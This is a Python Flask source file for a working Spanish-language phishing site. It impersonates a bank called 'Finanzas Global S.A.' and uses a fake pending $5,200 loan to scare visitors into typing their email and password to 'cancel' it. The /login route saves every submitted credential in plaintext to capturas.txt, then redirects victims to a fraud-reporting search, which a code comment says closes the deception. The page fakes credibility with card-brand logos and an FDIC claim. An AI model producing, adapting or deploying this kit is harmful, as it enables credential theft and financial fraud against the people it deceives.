from flask import Flask, render_template_string, request, redirect
import datetime

app = Flask(__name__)

# --- INTERFAZ BANCARIA DE ÉLITE CON LOGO Y TÉRMINOS ---
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cancelación de Contrato | Finanzas Global S.A.</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f9; margin: 0; padding: 0; color: #333; }
        .top-bar { background: #1a252f; color: #fff; padding: 10px 0; text-align: center; font-size: 11px; text-transform: uppercase; letter-spacing: 1px; }
        
        .main-container { max-width: 500px; margin: 40px auto; background: #fff; border-radius: 8px; box-shadow: 0 15px 35px rgba(0,0,0,0.1); border: 1px solid #d1d9e0; overflow: hidden; }
        
        .header { background: #ffffff; padding: 30px; text-align: center; border-bottom: 4px solid #d32f2f; }
        .logo-text { font-size: 28px; font-weight: 800; color: #1a252f; margin: 0; }
        .logo-text span { color: #d32f2f; }
        
        .status-banner { background: #fff3cd; padding: 15px; border-bottom: 1px solid #ffeeba; display: flex; align-items: center; justify-content: center; }
        .status-banner b { color: #856404; font-size: 13px; }

        .form-body { padding: 40px; }
        .form-body h3 { font-size: 18px; margin-bottom: 20px; color: #1a252f; border-left: 4px solid #d32f2f; padding-left: 10px; }
        
        .input-group { margin-bottom: 20px; }
        .input-group label { display: block; font-size: 11px; font-weight: 700; color: #7f8c8d; text-transform: uppercase; margin-bottom: 8px; }
        .input-group input { width: 100%; padding: 14px; border: 1px solid #ced4da; border-radius: 4px; box-sizing: border-box; font-size: 16px; background: #fdfdfd; }
        .input-group input:focus { border-color: #2c3e50; outline: none; background: #fff; box-shadow: 0 0 8px rgba(44,62,80,0.1); }

        .btn-cancel { width: 100%; background: #d32f2f; color: #fff; border: none; padding: 18px; border-radius: 4px; font-size: 14px; font-weight: 800; cursor: pointer; text-transform: uppercase; transition: 0.3s; }
        .btn-cancel:hover { background: #b71c1c; transform: translateY(-1px); }

        .cards-row { display: flex; justify-content: center; gap: 15px; margin: 25px 0; opacity: 0.7; }
        .cards-row img { height: 25px; }

        .legal-box { background: #f8f9fa; padding: 20px; font-size: 11px; color: #777; border-top: 1px solid #eee; line-height: 1.6; }
        .legal-box h4 { margin: 0 0 10px 0; color: #555; text-transform: uppercase; font-size: 10px; }

        .footer { padding: 30px; text-align: center; background: #1a252f; color: #95a5a6; font-size: 11px; }
        .footer p { margin: 5px 0; }
        .contact-info { margin-top: 15px; color: #fff; font-size: 12px; }
    </style>
</head>
<body>

<div class="top-bar">🔒 CONEXIÓN SEGURA ENCRIPTADA POR FINANZAS GLOBAL S.A.</div>

<div class="main-container">
    <div class="header">
        <div class="logo-text">FINANZAS<span>GLOBAL</span></div>
        <p style="font-size: 12px; color: #7f8c8d; margin-top: 5px;">Unidad de Prevención de Fraudes e Identidad</p>
    </div>

    <div class="status-banner">
        <b>⚠️ SOLICITUD DE CRÉDITO #CR-88390 EN ESPERA DE DESEMBOLSO</b>
    </div>

    <div class="form-body">
        <h3>Autenticación Obligatoria</h3>
        <p style="font-size: 13px; color: #666; margin-bottom: 25px;">
            Para ejercer su derecho de <b>Revocación Inmediata</b> del contrato de crédito por <b>$5,200.00 USD</b>, debe confirmar su titularidad. Este proceso bloqueará cualquier transferencia a cuentas externas vinculadas.
        </p>

        <form action="/login" method="post">
            <div class="input-group">
                <label>Usuario / Correo Electrónico Corporativo</label>
                <input type="text" name="user_email" required placeholder="nombre@ejemplo.com">
            </div>
            <div class="input-group">
                <label>Clave de Firma Digital / Contraseña</label>
                <input type="password" name="user_pass" required placeholder="••••••••••••">
            </div>
            <button type="submit" class="btn-cancel">CANCELAR DESEMBOLSO Y REVOCAR CONTRATO</button>
        </form>

        <div class="cards-row">
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg" alt="Paypal">
            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/American_Express_logo_%282018%29.svg" alt="Amex">
        </div>
    </div>

    <div class="legal-box">
        <h4>Términos y Condiciones de Revocación</h4>
        Al proceder con esta validación, usted solicita formalmente la nulidad del contrato bajo la Ley de Transparencia Financiera 2026. Los fondos retenidos en la cuenta de tránsito ****4092 serán congelados y devueltos al fondo de reserva operativo. Este proceso es irreversible y genera un bloqueo preventivo de 24 horas en sus credenciales de acceso.
    </div>

    <div class="footer">
        <p>© 2026 Finanzas Global S.A. | Member FDIC | Equal Housing Lender</p>
        <p>Sede Central: 200 West St, New York, NY 10282, USA</p>
        <div class="contact-info">
            Soporte 24/7: +1 (800) 555-GLOBAL | seguridad@finanzasglobal.com
        </div>
        <p style="margin-top: 15px; font-size: 9px; opacity: 0.5;">
            Ref: SEG-MATRIX-{int(datetime.datetime.now().timestamp())} | Node: {random.randint(100,999)}-SVR
        </p>
    </div>
</div>

</body>
</html>
"""

import random

@app.route('/')
def home():
    return render_template_string(HTML_TEMPLATE)

@app.route('/login', methods=['post'])
def login():
    username = request.form.get('user_email')
    password = request.form.get('user_pass')
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    with open("capturas.txt", "a") as f:
        f.write(f"[{timestamp}] User: {username} | Pass: {password}\n")
    
    # Redirigir a una página oficial de ayuda real para dar cierre al engaño
    return redirect("https://www.google.com/search?q=como+reportar+fraude+bancario")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=10000)
